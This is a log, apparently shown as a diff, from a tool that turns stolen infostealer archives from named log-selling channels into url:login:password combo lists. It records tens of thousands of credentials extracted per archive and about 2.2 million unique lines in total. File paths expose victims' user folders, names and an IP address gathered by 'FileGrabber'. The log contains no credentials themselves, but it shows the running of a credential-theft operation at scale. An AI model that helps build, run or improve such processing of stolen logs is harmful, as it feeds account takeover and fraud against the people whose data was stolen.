+[2026-06-21 03:51:06] SCAN LogsDiller Cloud_712_#247.zip | solid=False type=Zip entries=13315 pwFiles=392 combos=23006 fails=0 time=00:00:00
+[2026-06-21 03:51:06] LogsDiller Cloud_712_#247.zip -> COMPLETED SUCCESSFULLY (17.731 url:login:pass found, 392 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:06] SCAN LogsDiller Cloud_791_#117.zip | solid=False type=Zip entries=15077 pwFiles=312 combos=19480 fails=0 time=00:00:00
+[2026-06-21 03:51:06] LogsDiller Cloud_791_#117.zip -> COMPLETED SUCCESSFULLY (16.473 url:login:pass found, 312 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:07] SCAN LogsDiller Cloud_792_#244.zip | solid=False type=Zip entries=15226 pwFiles=428 combos=26750 fails=0 time=00:00:00
+[2026-06-21 03:51:07] LogsDiller Cloud_792_#244.zip -> COMPLETED SUCCESSFULLY (21.378 url:login:pass found, 428 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:08] SCAN LogsDiller Cloud_925_#57.zip | solid=False type=Zip entries=19351 pwFiles=445 combos=36976 fails=0 time=00:00:00
+[2026-06-21 03:51:08] LogsDiller Cloud_925_#57.zip -> COMPLETED SUCCESSFULLY (28.099 url:login:pass found, 445 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:09] SCAN LogsDiller Cloud_933_#34.zip | solid=False type=Zip entries=16891 pwFiles=597 combos=47499 fails=0 time=00:00:01
+[2026-06-21 03:51:09] LogsDiller Cloud_933_#34.zip -> COMPLETED SUCCESSFULLY (41.099 url:login:pass found, 597 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:10] OPEN FAILED AppNee.com.Corel.All.Products.Universal.Keygen.by.X-Force.2021.V2.7z -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_547a274c71df492abb3abd3dd92ef706\PK[DEDB5BC4F86071A6FCEF72A50FEAA570] [2022-03-16T02_08_05.39\FileGrabber\Users\Farooq\Documents\AppNee.com.Corel.All.Products.Universal.Keygen.by.X-Force.2021.V2.7z'
+[2026-06-21 03:51:10] SCAN LogsDiller Cloud_939_#30.zip | solid=False type=Zip entries=18768 pwFiles=331 combos=17498 fails=0 time=00:00:00
+[2026-06-21 03:51:10] LogsDiller Cloud_939_#30.zip -> COMPLETED SUCCESSFULLY (14.346 url:login:pass found, 331 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:10] OPEN FAILED Keygen.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_a9f2877f09b0488cb12c5628720886a3\NG[A95F74B3DFB7D297EC46ED50AA106E44] [2022-04-03T04_19_17.24\FileGrabber\Users\CIVIL UNIT\Documents\Keygen.rar'
+[2026-06-21 03:51:11] SCAN LogsDiller Cloud_939_#53.zip | solid=False type=Zip entries=20354 pwFiles=355 combos=24044 fails=0 time=00:00:00
+[2026-06-21 03:51:11] LogsDiller Cloud_939_#53.zip -> COMPLETED SUCCESSFULLY (20.519 url:login:pass found, 355 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:11] SCAN LogsDiller Cloud_945_#255.zip | solid=False type=Zip entries=17081 pwFiles=400 combos=33674 fails=0 time=00:00:00
+[2026-06-21 03:51:11] LogsDiller Cloud_945_#255.zip -> COMPLETED SUCCESSFULLY (26.985 url:login:pass found, 400 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:12] SCAN LogsDiller Cloud_946_#32.zip | solid=False type=Zip entries=18337 pwFiles=398 combos=32504 fails=0 time=00:00:00
+[2026-06-21 03:51:12] LogsDiller Cloud_946_#32.zip -> COMPLETED SUCCESSFULLY (16.788 url:login:pass found, 398 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:13] SCAN LogsDiller Cloud_980_#249.zip | solid=False type=Zip entries=19587 pwFiles=544 combos=35950 fails=0 time=00:00:00
+[2026-06-21 03:51:13] LogsDiller Cloud_980_#249.zip -> COMPLETED SUCCESSFULLY (29.343 url:login:pass found, 544 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:13] SCAN LogsDiller Cloud_983_#250.zip | solid=False type=Zip entries=20091 pwFiles=577 combos=28464 fails=0 time=00:00:00
+[2026-06-21 03:51:13] LogsDiller Cloud_983_#250.zip -> COMPLETED SUCCESSFULLY (23.563 url:login:pass found, 577 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:14] SCAN LogsDiller Cloud_990_#248.zip | solid=False type=Zip entries=20693 pwFiles=600 combos=33646 fails=0 time=00:00:00
+[2026-06-21 03:51:14] LogsDiller Cloud_990_#248.zip -> COMPLETED SUCCESSFULLY (28.224 url:login:pass found, 600 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:14] SCAN LogsDiller Cloud_1011_#257.zip | solid=False type=Zip entries=16881 pwFiles=371 combos=20772 fails=0 time=00:00:00
+[2026-06-21 03:51:14] LogsDiller Cloud_1011_#257.zip -> COMPLETED SUCCESSFULLY (16.723 url:login:pass found, 371 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:15] SCAN LogsDiller Cloud_1208_#141.zip | solid=False type=Zip entries=23608 pwFiles=636 combos=36712 fails=0 time=00:00:00
+[2026-06-21 03:51:15] LogsDiller Cloud_1208_#141.zip -> COMPLETED SUCCESSFULLY (28.286 url:login:pass found, 636 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:16] SCAN LogsDiller Cloud_1221_#108.zip | solid=False type=Zip entries=24045 pwFiles=627 combos=37664 fails=0 time=00:00:00
+[2026-06-21 03:51:16] LogsDiller Cloud_1221_#108.zip -> COMPLETED SUCCESSFULLY (32.710 url:login:pass found, 627 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:17] SCAN LogsDiller Cloud_1233_#102.zip | solid=False type=Zip entries=16807 pwFiles=315 combos=19984 fails=0 time=00:00:00
+[2026-06-21 03:51:17] LogsDiller Cloud_1233_#102.zip -> COMPLETED SUCCESSFULLY (14.979 url:login:pass found, 315 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:17] SCAN LogsDiller Cloud_1246_#51.zip | solid=False type=Zip entries=25388 pwFiles=553 combos=27837 fails=0 time=00:00:00
+[2026-06-21 03:51:17] LogsDiller Cloud_1246_#51.zip -> COMPLETED SUCCESSFULLY (25.062 url:login:pass found, 553 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:18] SCAN LogsDiller Cloud_1251_#258.zip | solid=False type=Zip entries=19542 pwFiles=297 combos=19021 fails=0 time=00:00:00
+[2026-06-21 03:51:18] LogsDiller Cloud_1251_#258.zip -> COMPLETED SUCCESSFULLY (15.448 url:login:pass found, 297 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:19] SCAN LogsDiller Cloud_1252_#252.zip | solid=False type=Zip entries=24657 pwFiles=656 combos=40895 fails=0 time=00:00:00
+[2026-06-21 03:51:19] LogsDiller Cloud_1252_#252.zip -> COMPLETED SUCCESSFULLY (24.572 url:login:pass found, 656 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:20] SCAN LogsDiller Cloud_1335_#58.zip | solid=False type=Zip entries=27706 pwFiles=942 combos=74196 fails=0 time=00:00:01
+[2026-06-21 03:51:20] LogsDiller Cloud_1335_#58.zip -> COMPLETED SUCCESSFULLY (60.184 url:login:pass found, 942 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:21] SCAN LogsDiller Cloud_1386_#43.zip | solid=False type=Zip entries=30186 pwFiles=848 combos=49089 fails=0 time=00:00:01
+[2026-06-21 03:51:21] LogsDiller Cloud_1386_#43.zip -> COMPLETED SUCCESSFULLY (39.716 url:login:pass found, 848 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:22] SCAN LogsDiller Cloud_1411_#100.zip | solid=False type=Zip entries=26140 pwFiles=399 combos=21543 fails=0 time=00:00:00
+[2026-06-21 03:51:22] LogsDiller Cloud_1411_#100.zip -> COMPLETED SUCCESSFULLY (18.580 url:login:pass found, 399 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:23] SCAN LogsDiller Cloud_1433_#246.zip | solid=False type=Zip entries=29555 pwFiles=746 combos=40021 fails=0 time=00:00:00
+[2026-06-21 03:51:23] LogsDiller Cloud_1433_#246.zip -> COMPLETED SUCCESSFULLY (29.406 url:login:pass found, 746 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:24] SCAN LogsDiller Cloud_1442_#254.zip | solid=False type=Zip entries=28537 pwFiles=782 combos=45383 fails=0 time=00:00:01
+[2026-06-21 03:51:24] LogsDiller Cloud_1442_#254.zip -> COMPLETED SUCCESSFULLY (36.025 url:login:pass found, 782 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:25] SCAN LogsDiller Cloud_1468_#114.zip | solid=False type=Zip entries=25226 pwFiles=352 combos=20516 fails=0 time=00:00:01
+[2026-06-21 03:51:25] LogsDiller Cloud_1468_#114.zip -> COMPLETED SUCCESSFULLY (17.369 url:login:pass found, 352 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:26] OPEN FAILED universal.xforce.keygen.Autodesk.2019.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_89af195681eb4ee48495d81ced4fbde0\EG[3D412F17FD77A9A708D72AD1758C768C] [2022-03-27T12_32_05.60\FileGrabber\Users\Lenovo\Desktop\universal.xforce.keygen.Autodesk.2019.rar'
+[2026-06-21 03:51:26] SCAN LogsDiller Cloud_1516_#46.zip | solid=False type=Zip entries=28835 pwFiles=650 combos=36242 fails=0 time=00:00:01
+[2026-06-21 03:51:26] LogsDiller Cloud_1516_#46.zip -> COMPLETED SUCCESSFULLY (31.179 url:login:pass found, 650 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:27] SCAN LogsDiller Cloud_1520_#99.zip | solid=False type=Zip entries=24973 pwFiles=368 combos=22375 fails=0 time=00:00:00
+[2026-06-21 03:51:27] LogsDiller Cloud_1520_#99.zip -> COMPLETED SUCCESSFULLY (17.851 url:login:pass found, 368 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:28] SCAN LogsDiller Cloud_1564_#147.zip | solid=False type=Zip entries=31102 pwFiles=914 combos=56738 fails=0 time=00:00:01
+[2026-06-21 03:51:28] LogsDiller Cloud_1564_#147.zip -> COMPLETED SUCCESSFULLY (24.976 url:login:pass found, 914 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:31] SCAN LogsDiller Cloud_1606_#251.zip | solid=False type=Zip entries=33536 pwFiles=915 combos=56056 fails=0 time=00:00:02
+[2026-06-21 03:51:31] LogsDiller Cloud_1606_#251.zip -> COMPLETED SUCCESSFULLY (36.581 url:login:pass found, 915 files) [password: no password] [00:00:02]
+[2026-06-21 03:51:32] SCAN LogsDiller Cloud_1612_#107.zip | solid=False type=Zip entries=34416 pwFiles=831 combos=55012 fails=0 time=00:00:01
+[2026-06-21 03:51:32] LogsDiller Cloud_1612_#107.zip -> COMPLETED SUCCESSFULLY (42.340 url:login:pass found, 831 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:33] SCAN LogsDiller Cloud_1613_#110.zip | solid=False type=Zip entries=30322 pwFiles=432 combos=33707 fails=0 time=00:00:00
+[2026-06-21 03:51:33] LogsDiller Cloud_1613_#110.zip -> COMPLETED SUCCESSFULLY (26.579 url:login:pass found, 432 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:35] SCAN LogsDiller Cloud_1666_#28.zip | solid=False type=Zip entries=33896 pwFiles=1225 combos=85038 fails=0 time=00:00:01
+[2026-06-21 03:51:35] LogsDiller Cloud_1666_#28.zip -> COMPLETED SUCCESSFULLY (70.621 url:login:pass found, 1225 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:36] SCAN LogsDiller Cloud_1722_#106.zip | solid=False type=Zip entries=33750 pwFiles=680 combos=34229 fails=0 time=00:00:00
+[2026-06-21 03:51:36] LogsDiller Cloud_1722_#106.zip -> COMPLETED SUCCESSFULLY (28.656 url:login:pass found, 680 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:36] OPEN FAILED KeyRep by aluth.com.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:51:36] SCAN LogsDiller Cloud_1778_#95.zip | solid=False type=Zip entries=31824 pwFiles=369 combos=19002 fails=0 time=00:00:00
+[2026-06-21 03:51:36] LogsDiller Cloud_1778_#95.zip -> COMPLETED SUCCESSFULLY (16.606 url:login:pass found, 369 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:37] OPEN FAILED produkey.zip -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_4242caa5dd23432ba0f4013a137e6e05\CO[558E8C51122D9504FE0A76FD1DFA4E30] [2022-05-19T23_07_08.8833579]\FileGrabber\Users\Mateus\Desktop\produkey.zip'
+[2026-06-21 03:51:38] SCAN LogsDiller Cloud_1781_#116.zip | solid=False type=Zip entries=32267 pwFiles=720 combos=44947 fails=0 time=00:00:01
+[2026-06-21 03:51:38] LogsDiller Cloud_1781_#116.zip -> COMPLETED SUCCESSFULLY (34.651 url:login:pass found, 720 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:38] OPEN FAILED winproductkey.zip -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_875d2aab5c1e40d9bf1d35f2d488602b\MY[1D0091E7402F47BCEAA79A4A304C73DD] [2022-05-10T19_36_54.3295782]\FileGrabber\Users\bardz\Documents\winproductkey.zip'
+[2026-06-21 03:51:39] SCAN LogsDiller Cloud_1792_#104.zip | solid=False type=Zip entries=31092 pwFiles=302 combos=21250 fails=0 time=00:00:01
+[2026-06-21 03:51:39] LogsDiller Cloud_1792_#104.zip -> COMPLETED SUCCESSFULLY (14.948 url:login:pass found, 302 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:40] SCAN LogsDiller Cloud_1858_#113.zip | solid=False type=Zip entries=33503 pwFiles=443 combos=26073 fails=0 time=00:00:00
+[2026-06-21 03:51:40] LogsDiller Cloud_1858_#113.zip -> COMPLETED SUCCESSFULLY (21.520 url:login:pass found, 443 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:41] OPEN FAILED avast_cleanup_premium_22_1_6921_crack___activation_key_download_2022.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:51:41] SCAN LogsDiller Cloud_1878_#109.zip | solid=False type=Zip entries=35460 pwFiles=505 combos=32032 fails=0 time=00:00:00
+[2026-06-21 03:51:41] LogsDiller Cloud_1878_#109.zip -> COMPLETED SUCCESSFULLY (25.768 url:login:pass found, 505 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:43] SCAN LogsDiller Cloud_1909_#115.zip | solid=False type=Zip entries=34979 pwFiles=595 combos=36393 fails=0 time=00:00:01
+[2026-06-21 03:51:43] LogsDiller Cloud_1909_#115.zip -> COMPLETED SUCCESSFULLY (31.405 url:login:pass found, 595 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:46] SCAN LogsDiller Cloud_2070_#111.zip | solid=False type=Zip entries=38134 pwFiles=445 combos=23499 fails=0 time=00:00:02
+[2026-06-21 03:51:46] LogsDiller Cloud_2070_#111.zip -> COMPLETED SUCCESSFULLY (20.098 url:login:pass found, 445 files) [password: no password] [00:00:02]
+[2026-06-21 03:51:47] SCAN LogsDiller Cloud_2111_#105.zip | solid=False type=Zip entries=40185 pwFiles=759 combos=46709 fails=0 time=00:00:01
+[2026-06-21 03:51:47] LogsDiller Cloud_2111_#105.zip -> COMPLETED SUCCESSFULLY (35.271 url:login:pass found, 759 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:49] OPEN FAILED 4MeKey Crack.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:51:50] SCAN LogsDiller Cloud_2511_#98.zip | solid=False type=Zip entries=40988 pwFiles=511 combos=29891 fails=0 time=00:00:02
+[2026-06-21 03:51:50] LogsDiller Cloud_2511_#98.zip -> COMPLETED SUCCESSFULLY (25.166 url:login:pass found, 511 files) [password: no password] [00:00:02]
+[2026-06-21 03:51:51] SCAN LogsDiller Cloud_2519_#101.zip | solid=False type=Zip entries=34169 pwFiles=736 combos=43862 fails=0 time=00:00:01
+[2026-06-21 03:51:51] LogsDiller Cloud_2519_#101.zip -> COMPLETED SUCCESSFULLY (37.353 url:login:pass found, 736 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:53] SCAN LogsDiller Cloud_2523_#118.zip | solid=False type=Zip entries=52888 pwFiles=1611 combos=89797 fails=0 time=00:00:01
+[2026-06-21 03:51:53] LogsDiller Cloud_2523_#118.zip -> COMPLETED SUCCESSFULLY (65.858 url:login:pass found, 1611 files) [password: no password] [00:00:01]
+[2026-06-21 03:51:54] OPEN FAILED Euro.Truck.Simulator.2.1.40.part09.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:51:55] OPEN FAILED Euro.Truck.Simulator.2.1.40.part10.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:51:55] OPEN FAILED Euro.Truck.Simulator.2.1.40.part11.rar -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:51:56] SCAN LogsDiller Cloud_2773_#96.zip | solid=False type=Zip entries=46434 pwFiles=537 combos=34125 fails=0 time=00:00:03
+[2026-06-21 03:51:56] LogsDiller Cloud_2773_#96.zip -> COMPLETED SUCCESSFULLY (27.797 url:login:pass found, 537 files) [password: no password] [00:00:03]
+[2026-06-21 03:51:58] SCAN LogsDiller Cloud_3277_#253.zip | solid=False type=Zip entries=66374 pwFiles=1738 combos=91482 fails=0 time=00:00:02
+[2026-06-21 03:51:58] LogsDiller Cloud_3277_#253.zip -> COMPLETED SUCCESSFULLY (38.358 url:login:pass found, 1738 files) [password: no password] [00:00:02]
+[2026-06-21 03:51:58] OPEN FAILED microsoft.prerelease_protected.mainos_lang_mk-mk.spkg_5718e6d08132face5e266dc09889b1797db20685.cab -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-21 03:51:58] SCAN LogsDiller Cloud_Free_240_#195.zip | solid=False type=Zip entries=5077 pwFiles=162 combos=22541 fails=0 time=00:00:00
+[2026-06-21 03:51:58] LogsDiller Cloud_Free_240_#195.zip -> COMPLETED SUCCESSFULLY (16.896 url:login:pass found, 162 files) [password: no password] [00:00:00]
+[2026-06-21 03:51:59] OPEN FAILED VG Tool 4.1_KeyGEN.rar -> IOException: Operation did not complete successfully because the file contains a virus or potentially unwanted software. : 'C:\Users\Administrator\AppData\Local\Temp\2\SS_ULP_c83dc266a08e486188dfe6c9604df9d5\23338_MX_189.180.39.74_30_04_2026\Files\Desktop\cel\VG Tool 4.1_KeyGEN.rar'
+[2026-06-21 03:51:59] SCAN LogsDiller Cloud_Free_372_#194.zip | solid=False type=Zip entries=8930 pwFiles=245 combos=32103 fails=0 time=00:00:00
+[2026-06-21 03:51:59] LogsDiller Cloud_Free_372_#194.zip -> COMPLETED SUCCESSFULLY (21.456 url:login:pass found, 245 files) [password: no password] [00:00:00]
+[2026-06-21 03:52:01] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-21 03:52:02] SCAN LogsDiller Cloud_Free_500_#196.zip | solid=False type=Zip entries=10900 pwFiles=372 combos=30085 fails=0 time=00:00:02
+[2026-06-21 03:52:02] LogsDiller Cloud_Free_500_#196.zip -> COMPLETED SUCCESSFULLY (22.925 url:login:pass found, 372 files) [password: no password] [00:00:02]
+[2026-06-21 03:52:02] Archive to ULP finished | unique lines: 2212031 | failed: 11 | elapsed: 00:02:50
+[2026-06-21 04:01:52] ============================================================
+[2026-06-21 04:01:52] Archive to ULP started | items: 111 | mode: Archives | threads: 5
+[2026-06-21 04:01:52] Password pre-check started for 111 archive(s).
+[2026-06-21 04:01:52] PASSWORD @beetraffic 1603 MIX 07-04-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:52] PASSWORD @beetraffic 1609 MIX 14-04-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:52] PASSWORD @beetraffic 3000 MIX 17-06-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:52] PASSWORD @beetraffic 3000 MIX 20-06-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:52] PASSWORD @beetraffic 4000 MIX 15-06-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic 4500 MIX 02-06-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic 5000 MIX 08-06-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic 5555 MIX 11-06-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic 6000 04-06-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic_cloud 1420 MIX 07-05-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic_cloud 1500 MIX 12-05-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic_cloud 1808 MIX 01-05-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic_cloud 1972 MIX 28-04-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:56] PASSWORD @beetraffic_cloud 4141 MIX 21-04-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 04:01:58] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️ (2).rar -> settings password | solid=False type=Rar
+[2026-06-21 04:01:59] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️ (3).rar -> settings password | solid=False type=Rar
+[2026-06-21 04:01:59] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar -> settings password | solid=False type=Rar
+[2026-06-21 04:01:59] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️.rar -> settings password | solid=False type=Rar
+[2026-06-21 04:01:59] PASSWORD ⚡️Luffich&Cloud FREE TXT⚡️ (2).rar -> no password | solid=False type=Rar
+[2026-06-21 04:01:59] PASSWORD ⚡️Luffich&Cloud FREE TXT⚡️ (3).rar -> no password | solid=False type=Rar
+[2026-06-21 04:01:59] PASSWORD ⚡️Luffich&Cloud FREE TXT⚡️.rar -> no password | solid=False type=Rar
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_ 224_#64.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_ 473_#63.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_211_#26.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_308_#54.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_339_#137.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_341_#36.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_401_#47.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_420_#143.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_421_#144.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_433_#150.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_441_#149.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_451_#59.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_493_#61.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_493_#119.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_494_#142.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_495_#31.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_502_#79.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_511_#56.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_513_#73.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_521_#68.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_526_#35.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_527_#140.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_530_#66.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_535_#151.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_537_#146.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_541_#27.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_545_#42.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_578_#50.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_591_#39.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_612_#60.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_618_#148.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_626_#44.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_645_#256.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_655_#243.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_667_#245.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_672_#52.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_678_#55.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_687_#145.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_691_#62.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_702_#37.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_711_#24.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_712_#247.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_791_#117.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_792_#244.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_925_#57.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_933_#34.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_939_#30.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_939_#53.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_945_#255.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_946_#32.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_980_#249.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_983_#250.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_990_#248.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1011_#257.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1208_#141.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1221_#108.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1233_#102.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1246_#51.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1251_#258.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1252_#252.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1335_#58.zip -> no password | solid=False type=Zip
+[2026-06-21 04:01:59] PASSWORD LogsDiller Cloud_1386_#43.zip -> no password | solid=False type=Zip
